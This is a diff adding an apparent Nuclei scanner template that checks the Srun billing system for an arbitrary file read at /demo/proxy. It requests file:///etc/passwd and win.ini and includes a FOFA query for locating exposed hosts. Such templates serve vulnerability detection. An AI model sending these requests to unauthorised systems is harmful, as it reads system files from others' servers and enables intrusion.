@@ -1,0 +1,28 @@
+id: srun-proxy-fileread
+info:
+  name: 深澜计费管理系统 proxy - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E6%B7%B1%E6%BE%9C%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fproxy%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="/js/lib/slimscroll.js"
+  tags: srun,fileread
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/demo/proxy?url=file:///etc/passwd"
+      - "{{BaseURL}}/demo/proxy?url=file:///c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
